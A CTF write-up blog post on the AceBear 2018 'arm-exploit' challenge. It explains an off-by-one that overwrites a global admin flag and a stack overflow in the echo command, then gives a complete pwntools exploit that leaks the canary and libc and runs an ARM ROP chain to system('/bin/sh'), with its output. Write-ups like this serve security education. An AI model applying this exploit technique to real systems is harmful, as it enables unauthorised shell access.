---
author: zero
comments: true
date: 2018-02-01 00:00:00
layout: post
slug: acebear-ctf-2018-arm-exploit
title: AceBear-CTF-2018-Arm-Exploit
---

**Description**:
There was no description of this challenge. The challenge name was already strightforward enough though... 

## File

```
~/Desktop
▶ file arm-exploit
arm-exploit: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=cbaf26f5088911adc7a36ef8ac96660a33f617d1, not stripped
```

The given binary was not stripped. Since it is not so common to see arm binary in jeopardy style ctf, I guess the challenge writer just wanted to give out the binary without stripping the symbols.

## Protections

```
peda-arm > checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
Both Canary and NX were enabled, which is pretty standard in ctf nowdays.

## Program

There are five options in the program.

```
**************************Welcome to Arm Exploit**************************
*                                                                        *
*************************Challenge Created By CNV*************************
*   Team: AceBear                                                        *
*   My blog: https://chung96vn.blogspot.com/                             *
**************************************************************************
*******************Arm Exploit******************
*                                              *
* 1 - info                                     *
* 2 - login                                    *
* 3 - echo                                     *
* 4 - change username                          *
* 5 - exit                                     *
************************************************
Your choice:
```

* *Info*
  - It shows the current username and state (which I am going to talk about later down the road).

    ```
    **************************User Info***************************
    *                                                            *
    *Username: hello
    **************************************************************
    *                                                            *
    *State: 1
    **************************************************************
    ```
* *Login*
  - Typical login prompt (ask username and password)

    ```
    Username: hello
    password: good
    Guest logined!
    ```
    
* *Echo*
  - Prompt with a few (three) commands
   
    ```
    Welcome guest echo!
    guest@arm-exploit:~$
    ```

* *Chanage Username*
  - Self Explanatory 
  
    ```
    Your choice: 4
    New username: hello
    Change username done!
    ```

* *Exit*
  - Self Explantory

## Analysis

```
**************************Welcome to Arm Exploit**************************
*                                                                        *
*************************Challenge Created By CNV*************************
*   Team: AceBear                                                        *
*   My blog: https://chung96vn.blogspot.com/                             *
**************************************************************************
*******************Arm Exploit******************
*                                              *
* 1 - info                                     *
* 2 - login                                    *
* 3 - echo                                     *
* 4 - change username                          *
* 5 - exit                                     *
************************************************
Your choice: 2
Username: a
password: a
Guest logined!
*******************Arm Exploit******************
*                                              *
* 1 - info                                     *
* 2 - login                                    *
* 3 - echo                                     *
* 4 - change username                          *
* 5 - exit                                     *
************************************************
Your choice: 1
**************************User Info***************************
*                                                            *
*Username: hello
**************************************************************
*                                                            *
*State: 1
**************************************************************
*******************Arm Exploit******************
*                                              *
* 1 - info                                     *
* 2 - login                                    *
* 3 - echo                                     *
* 4 - change username                          *
* 5 - exit                                     *
************************************************
Your choice: 3
Welcome guest echo!
guest@arm-exploit:~$ l
Invalid Command! Try help
guest@arm-exploit:~$ help
List command:
$ echo argument
$ exit
$ help
guest@arm-exploit:~$ echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
guest@arm-exploit:~$ Invalid Command! Try help
guest@arm-exploit:~$ Invalid Command! Try help
guest@arm-exploit:~$ exit
```
Just like any other ctf problem, I always play around with the input and options as a first step because it often leads to crashing the program and it is much easier to triage the vuln.  

After a while, I noticed that I was able to get into the root prompt even though I was a guest:

```
**************************Welcome to Arm Exploit**************************
*                                                                        *
*************************Challenge Created By CNV*************************
*   Team: AceBear                                                        *
*   My blog: https://chung96vn.blogspot.com/                             *
**************************************************************************
*******************Arm Exploit******************
*                                              *
* 1 - info                                     *
* 2 - login                                    *
* 3 - echo                                     *
* 4 - change username                          *
* 5 - exit                                     *
************************************************
Your choice: 2
Username: a
password: a
Guest logined!
*******************Arm Exploit******************
*                                              *
* 1 - info                                     *
* 2 - login                                    *
* 3 - echo                                     *
* 4 - change username                          *
* 5 - exit                                     *
************************************************
Your choice: 4
New username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Change username done!
*******************Arm Exploit******************
*                                              *
* 1 - info                                     *
* 2 - login                                    *
* 3 - echo                                     *
* 4 - change username                          *
* 5 - exit                                     *
************************************************
Your choice: Invalid choice!
*******************Arm Exploit******************
*                                              *
* 1 - info                                     *
* 2 - login                                    *
* 3 - echo                                     *
* 4 - change username                          *
* 5 - exit                                     *
************************************************
Your choice: Invalid choice!
*******************Arm Exploit******************
*                                              *
* 1 - info                                     *
* 2 - login                                    *
* 3 - echo                                     *
* 4 - change username                          *
* 5 - exit                                     *
************************************************
Your choice: 4
New username: root
Change username done!
*******************Arm Exploit******************
*                                              *
* 1 - info                                     *
* 2 - login                                    *
* 3 - echo                                     *
* 4 - change username                          *
* 5 - exit                                     *
************************************************
Your choice: 3
Welcome root echo!
root@arm-exploit:~$ help
List command:
$ echo argument
$ exit
$ help
```  

So why did it drop us into the root prompt? 

Just to keep it direct to the point:

1. It first generates the random password that is 16 bytes long by reading /dev/urandom
2. When the user attempts to login, it checks if the username is root and password matches the pre-generated one.
3. If both of them are correct, the global flag is set to *0* otherwise *1*.
4. Based on this flag, the user gets either root or guest echo prompt.

This means that this global flag was somehow set to "0" and it did:

```
**************************User Info***************************
*                                                            *
*Username: root
**************************************************************
*                                                            *
*State: 0
**************************************************************
```

The flaw was in *change username* option where there was an off-by-one error. This function reads in 32 bytes from the user and copys into the global buffer "user" (which has a size of 32).

The user buffer is located at *0x0002209C* and the global flag is located at *0x000220BC* , which is exactly 32 bytes apart.

By giving an input with exactly 32 bytes, the null-byte at the end overwrites the value of global flag to zero.

```
>>> 0x000220BC-0x0002209C
32
```

Since the program's echo prompt only checks the global flag and the username, changing the username to "root" after overwriting the global flag should drop us into the root prompt :) 

{% highlight c %}

int echo()
{
  int result; // r0@4
  int v1; // r0@5

  if ( !logined )
    return puts("You must login!");
  if ( isAdmin || strcmp(user, "root") ) // here
  {
    v1 = puts("Welcome guest echo!");
    result = guestecho(v1);
  }
  else
  {
    puts("Welcome root echo!");
    result = rootecho();
  }
  return result;
}

{% endhighlight %}

From here, I found that there was a buffer overflow where it reads in 256 bytes into the buffer size of 128. 

## Exploit

At this point, it was a typical ctf challenge where you leak the canary by overwriting its last byte and create a rop chain that pops the shell.    

{% highlight python %}

from pwn import *

context.log_level='DEBUG'

local = 0

if local:
	r = remote("localhost",4444)
else:
	r = remote("armexploit.acebear.site",3001)
	libc = ELF("/home/zero/libc-2.19.so")

pause()

r.recvuntil("choice:")
r.sendline("2")
r.recvuntil(":")
r.sendline("dumb")
r.recvuntil(":")
r.sendline("dumb")

r.recvuntil("choice:")
r.sendline("4")
r.recvuntil(":")
r.sendline("A"*32)

r.recv()

r.recvuntil("choice:")
r.sendline("4")
r.recvuntil(":")
r.sendline("stuff")

r.recvuntil("choice:")
r.sendline("4")
r.recvuntil(":")
r.sendline("root")

r.recvuntil("choice:")
r.sendline("3")
r.send("echo "+"\x90"*123+"\x90")
r.recvuntil("~$")

data = r.recvuntil("~$")
canary =  u32("\x00"+data[125:128])
stack_leak = u32(data[128:132])-0x88+0x35

log.info("Canary: {}".format(hex(canary)))
log.info("Stack: {}".format(stack_leak))

payload = ""
payload += "/bin/sh\x00"+"\x90"*115
payload += p32(canary)
payload += "B"*4
payload += p32(0x1107c) #pop     {r4, r5, r6, r7, r8, r9, sl, pc}
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0x00022014) #printfgot
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0x000105dc)#pop {r3, pc}
payload += p32(0x00010660) #puts@plt
payload += p32(0x1106c) #mov r0, r7 bl r3
payload += p32(0x1106c) #mov r0, r7 bl r3
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0x00022014) #printfgot
payload += p32(0)
payload += p32(0)
payload += p32(0x00010FB4) #go back to main


r.send("echo "+payload)
r.recv()
r.sendline("exit")

r.recv()
data = r.recv()

if local:
	system = u32(data[0:4])-44029
	read = system+0x5cc80
	write = system+0x5cd00
	op = system+0x5c900

	log.info("Read: {}".fomrat(hex(read)))
	log.info("Write: {}".fomrat(hex(write)))
	log.info("Open: {}".fomrat(hex(op)))

else:
	libc.address = u32(data[0:4])-libc.symbols['printf']
	system = libc.symbols['system']

log.info("System: {}".format(hex(system)))

payload = ""
payload += "/bin/sh\x00"
payload += "\x90"*115
payload += p32(canary)
payload += "B"*4
payload += p32(0x1107c) #pop {r4, r5, r6, r7, r8, r9, sl, pc}
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(stack_leak) #/bin/sh
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0x000105dc)#pop {r3, pc}
payload += p32(system)
payload += p32(0x0001106c) # mov r0, r7 ; blx r3

r.sendline("3")
r.recv()
r.sendline("echo "+payload)
r.recv()
r.sendline("exit")

r.interactive()

{% endhighlight %}

The result of running the exploit

```
~/Desktop
▶ python arms.py
[*] '/home/zero/libc-2.19.so'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to armexploit.acebear.site on port 3001: Done
[*] Paused (press any to continue)
[*] Canary: 0xc387b900
[*] Stack: 0xbebfabb1
[*] System: 0xb6eb3210
[*] Switching to interactive mode
cat /home/arm_exploit/flag
AceBear{arm_i5_my_sad_m3m0ry}
exit
[*] Got EOF while reading in interactive
```
